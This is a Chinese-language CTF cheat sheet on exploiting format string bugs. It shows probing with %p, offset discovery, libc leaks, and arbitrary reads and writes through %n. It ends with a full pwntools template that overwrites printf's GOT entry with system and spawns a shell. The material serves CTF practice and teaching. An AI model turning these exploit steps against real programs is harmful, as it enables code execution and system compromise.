# 格式化字符串漏洞

## 触发模式

`printf(user_input)` —— 用户输入直接作 fmt，导致：
- `%x` `%p` 读栈（任意泄露）
- `%s` 读任意地址（参数指针解引用）
- `%n` 写任意地址（写参数指针指向的位置）

## 探测

```bash
echo "%x %x %x %x %x" | ./bin
echo "%p %p %p %p %p %p %p" | ./bin
echo "AAAA-%p-%p-%p-%p-%p-%p-%p-%p" | ./bin
# 找到 0x41414141 出现的位置 → 偏移确定
```

## 计算 fmt 偏移

```python
from pwn import *
p = process('./bin')
p.sendline(b'AAAABBBB-%6$p-%7$p-%8$p')
print(p.recv())   # 看哪个 %N$p 对应 AAAA
```

x86_64 前 6 个参数在寄存器（rdi,rsi,rdx,rcx,r8,r9），从第 7 个开始在栈。
x86 全部在栈。

## 泄露 libc

```python
# 假设第 6 个参数是栈上 ret，含 libc 地址
p.sendline(b'%6$p')
leak = int(p.recv().strip(), 16)
libc_base = leak - LIBC_OFFSET
```

## 任意地址读

```python
# %s 读地址
payload = p64(target_addr) + b'%7$s'   # 第 7 个参数 = payload 自己
p.sendline(payload)
```

## 任意地址写（%n）

`%n` 把已打印字符数写到指针。配合宽度控制：
```python
# pwntools fmtstr_payload 自动构造
from pwn import *
payload = fmtstr_payload(6, {got['printf']: libc.sym['system']})
p.sendline(payload)
```

`fmtstr_payload(offset, {addr: value})`：offset 是格式串自己在栈上的偏移。

## 缩短 payload

- `%hn` 写 2 字节
- `%hhn` 写 1 字节
- 分块写：高 16 位用 `%hn`，低 16 位用另一个 `%hn`

`fmtstr_payload` 自动选择 byte/short/int 大小最优。

## 第 N 次 printf

如果第一次格式串触发后程序还在循环（while loop）：
- 通过修改返回地址让程序回到 main
- 或者直接攻 `main` 的栈帧让循环继续
- 或者改 `exit` 的 GOT 让退出时执行 system

## printf vs sprintf

`sprintf(buf, user_input)` 同样可利用，但需要后续逻辑用到 buf。

## CTF 模板

```python
from pwn import *
elf = ELF('./bin')
libc = ELF('./libc.so.6')
p = process('./bin')

# 1. 探测偏移
p.sendline(b'%6$p')
leak1 = int(p.recvline().strip(), 16)
log.success(f'leak1 = {hex(leak1)}')

# 2. 计算 libc base
libc.address = leak1 - libc.sym['__libc_start_main'] - OFFSET
log.success(f'libc base = {hex(libc.address)}')

# 3. 改 GOT
payload = fmtstr_payload(6, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)

# 4. 触发
p.sendline(b'/bin/sh\x00')
p.interactive()
```

## 防护

- `FORTIFY` 编译时检查 fmt 字符串常量 → CTF 题通常关掉
- 静态分析工具会标记 `printf(input)` → 题目可能藏在间接调用里
